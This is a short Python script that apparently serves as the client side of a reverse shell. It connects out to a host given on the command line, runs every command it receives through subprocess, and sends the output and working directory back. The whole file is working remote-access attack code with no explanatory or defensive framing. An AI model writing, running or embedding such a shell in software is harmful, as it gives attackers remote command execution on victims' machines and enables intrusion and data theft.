import socket
import os
import subprocess
import sys
from constant import PORT, BUFFER_SZ, SEPERATOR

ATTACK_PORT = sys.argv[1]

soc = socket.socket()
soc.connect((ATTACK_PORT, PORT))

pwd = os.getcwd()

soc.send(pwd.encode())

while True:
    cmd = soc.recv(BUFFER_SZ).decode()
    splited_cmd = cmd.split()
    match cmd.lower():
        case "exit":
            break

    match splited_cmd[0].lower():
        case "cd":
            try:
                os.chdir(' '.join(splited_cmd[1:]))
            except FileNotFoundError as err:
                output = str(err)
            else:
                output = ""
        case _:
            output = subprocess.getoutput(cmd)
    pwd = os.getcwd()
    soc.send(f"{output}{SEPERATOR}{pwd}".encode())
soc.close()
